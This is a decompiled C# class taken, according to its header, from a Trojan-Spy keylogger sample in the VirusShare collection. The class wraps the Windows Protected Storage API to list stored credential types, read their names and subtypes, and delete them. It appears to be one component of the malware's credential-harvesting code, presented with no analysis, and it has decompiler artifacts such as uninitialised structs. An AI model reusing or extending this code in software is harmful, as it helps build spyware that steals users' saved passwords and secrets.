// Decompiled with JetBrains decompiler
// Type: Roy.CType_Renamed
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Roy.PStoreLib;
using System;
using System.Runtime.InteropServices;

namespace Roy
{
  internal class CType_Renamed : CUtils
  {
    private IPStore m_IPStore;
    private Guid m_Guid;
    private string m_DisplayName;
    private PST_KEY m_KeyType;
    private CSubTypes m_SubTypes;

    public CType_Renamed() => this.m_Guid = new Guid();

    internal void Init(IPStore PStore, PST_KEY KeyType, ref Guid guidType)
    {
      this.m_IPStore = PStore;
      this.m_Guid = guidType;
      int ppInfo;
      this.m_IPStore.GetTypeInfo(KeyType, ref guidType, ref ppInfo, 0);
      if (ppInfo != 0)
      {
        IntPtr ptr = new IntPtr(ppInfo);
        PST_TYPEINFO pstTypeinfo1;
        object structure = Marshal.PtrToStructure(ptr, pstTypeinfo1.GetType());
        PST_TYPEINFO pstTypeinfo2;
        this.m_DisplayName = this.CopyString((structure != null ? (PST_TYPEINFO) structure : pstTypeinfo2).szDisplayName);
        ptr = new IntPtr(ppInfo);
        Marshal.FreeCoTaskMem(ptr);
      }
      this.m_SubTypes = new CSubTypes();
      this.m_SubTypes.Init(PStore, KeyType, ref guidType);
    }

    public void Delete() => this.m_IPStore.DeleteType(this.m_KeyType, ref this.m_Guid, 0);

    public string TypeGuid => this.m_Guid.ToString();

    public string DisplayName => this.m_DisplayName;

    public CSubTypes SubTypes => this.m_SubTypes;
  }
}
